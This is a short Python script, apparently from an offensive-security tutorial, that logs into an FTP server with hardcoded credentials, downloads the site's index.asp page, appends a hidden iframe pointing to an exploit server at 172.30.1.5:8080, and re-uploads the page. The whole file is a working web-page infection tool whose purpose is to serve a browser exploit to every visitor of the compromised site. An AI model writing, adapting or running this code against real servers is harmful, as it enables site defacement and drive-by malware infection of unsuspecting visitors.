import ftplib

def injectPage(ftp,page,redirect):
	f = open(page + '.tmp','w')
	ftp.retrlines('RETR ' + page,f.write)
	print '[+] Downloaded Page: ' + page
	f.write(redirect)
	f.close()
	print '[+] Injected Malicious Iframe on: ' + page
	ftp.storlines('STOR ' + page, open(page+ '.tmp'))
	print '[+] Uploaded Injected Page:' + page


host = '172.30.1.7'
userName = 'good'
passWord = 'good'
ftp = ftplib.FTP(host)
ftp.login(userName,passWord)
redirect = '<iframe src='+'"http://172.30.1.5:8080/exploit"></iframe>'
injectPage(ftp,'index.asp',redirect)
